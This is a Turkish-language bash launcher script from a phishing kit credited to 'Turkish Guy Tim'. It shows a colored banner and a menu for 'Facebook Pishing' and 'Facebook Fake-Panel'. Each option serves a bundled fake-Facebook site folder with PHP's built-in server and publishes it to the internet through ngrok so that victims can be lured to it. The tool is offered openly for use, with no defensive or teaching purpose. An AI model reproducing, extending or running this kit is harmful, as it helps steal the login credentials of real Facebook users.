GNU nano 3.2                                                                        
start.sh

#!/bin/bash
#Turkish Guy Tim

r
clear
echo -e  "\e[37m
  _____________________   __   __
 \e[36m|__   __/ __ _|__   __|  \ \ / /
 \e[34m   | | | |  __   | |      \ V / 
\e[37m    | | | | |_ |  | |       > <     Facebook
 \e[36m   | | | |__| |  | |      / . \ 
 \e[34m   |_|  \_____|  |_|     /_/ \_\

    \e[32m=============================


\e[31m===========================================|
\e[31m|[01]\e[37m Facebook Pishing                     \e[31m|
\e[31m|[02]\e[37m Facebook Fake-Panel                  \e[31m|
\e[31m===========================================|


\e[31m[00]\e[37m Menü
\e[31m[99]\e[37m Exit
"
echo -e "\e[31m"
read -p "| Numara Seçiniz:" islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: face01"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-facebook/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32mKodunuz Code: face02"
        sleep 2
        echo ""
        echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
        sleep 4
        cd Site-fakepanel/
        php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 0 || $islem == 00 ]]; then
cd ..
cd ..
bash tgtx.sh
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mTurkish Guy Tim İyi Günler Diler"
clear
sleep 1
exit 1
else
echo ""
echo -e "\e[31m Lütfen Girdiğiniz İşlem Numarasını Kontrol Edin...."
sleep 3
clear
bash Facebook.sh
fi
